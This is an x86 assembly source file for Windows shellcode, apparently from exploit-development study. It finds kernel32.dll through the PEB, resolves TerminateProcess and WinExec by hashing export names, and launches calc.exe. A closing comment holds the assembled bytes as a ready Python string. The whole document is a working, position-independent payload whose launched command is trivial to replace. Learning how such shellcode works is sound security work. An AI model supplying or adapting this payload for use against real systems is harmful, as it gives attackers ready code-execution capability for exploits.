global _start

_start:
;    int3
    mov ebp, esp                    ; new stack frame
    sub esp, 0x28                   ; space for variables

    .find_kernel32:
        xor ecx, ecx                ; TEB structure
        mov esi, [fs: ecx + 0x30]   ; PEB Address
        mov esi, [esi + 0xc]        ; ntdll!PebLdr
        mov esi, [esi + 0x1c]       ; InInitializationOrderModuleList

    .next_module:
        mov ebx, [esi + 0x8]        ; Base address
        mov edi, [esi + 0x20]       ; Module name
        mov esi, [esi]              ; Next element
        cmp cx, [edi + 0x18]        ; len("kernel32.dll") * 2 [end = 0x0000]
        jnz .next_module            ; if zf == 0

        jmp .find_short             ; short jump

    .find_ret:
        pop esi                     ; $esi = return addr
        mov [ebp - 0x8], esi        ; var8 = .find_function
        jmp .symbol_kernel32        ; load function from kernel32

    .find_short:
        call .find_ret              ; relative call

    .find_function:
        pusha                       ; save all registers
        mov eax, [ebx + 0x3c]       ; RVA to PE signature
        mov edi, [ebx + eax + 0x78] ; RVA of Export Table
        add edi, ebx                ; Export Table
        mov ecx, [edi + 0x18]       ; NR of Names
        mov eax, [edi + 0x20]       ; RVA of Name Pointer Table
        add eax, ebx                ; Name Pointer Table
        mov [ebp - 0x4], eax        ; var4 = Name Pointer Table

    .find_loop:
        jecxz .find_end             ; if ecx = 0x0
        dec ecx                     ; counter -= 1
        mov eax, [ebp - 0x4]        ; $eax = Name Pointer Table
        mov esi, [eax + ecx * 4]    ; RVA of symbol name
        add esi, ebx                ; symbol name

        xor eax, eax                ; $eax = 0x0
        cdq                         ; $edx = 0x0
        cld                         ; DF = 0

    .compute_hash:
        lodsb                       ; load in al next byte from esi
        test al, al                 ; check null terminator
        jz .compare_hash            ; If ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

   .compare_hash:
        cmp edx, [esp + 0x24]       ; cmp edx, hash
        jnz .find_loop              ; if zf != 1
        mov edx, [edi + 0x24]       ; RVA of Ordinal Table
        add edx, ebx                ; Ordinal Table
        mov cx, [edx + 2 * ecx]     ; extrapolate ordinal functions
        mov edx, [edi + 0x1c]       ; RVA of Address Table
        add edx, ebx                ; Address Table
        mov eax, [edx + 4 * ecx]    ; RVA of function
        add eax, ebx                ; function
        mov [esp + 0x1c], eax       ; overwrite eax from pushad

    .find_end:
        popa                        ; restore registers
        ret                         ; return

    .symbol_kernel32:
        push 0x8ee05933             ; TerminateProcess() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0xc], eax        ; var12 = ptr to TerminateProcess()

        push 0x10121ee3             ; WinExec() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x10], eax       ; var16 = ptr to WinExec()

    .call_winexec:
        xor ecx, ecx                ; $ecx = 0x0
        push ecx                    ; "\x00"
        push 0x6578652e             ; ".exe"
        push 0x636c6163             ; "calc"
        mov esi, esp                ; "calc.exe"

        push 0x1                    ; uCmdShow
        push esi                    ; lpCmdLine
        call [ebp - 0x10]           ; call WinExec()

    .exit:
        push ecx                    ; uExitCode
        push 0xffffffff             ; hProcess
        call [ebp - 0xc]            ; call TerminateProcess()

; shellcode = b"\x89\xe5\x83\xec\x28\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x3b\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\xf8\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x33\x59\xe0\x8e\xff\x55\xf8\x89\x45\xf4\x68\xe3\x1e\x12\x10\xff\x55\xf8\x89\x45\xf0\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe6\x6a\x01\x56\xff\x55\xf0\x51\x6a\xff\xff\x55\xf4"
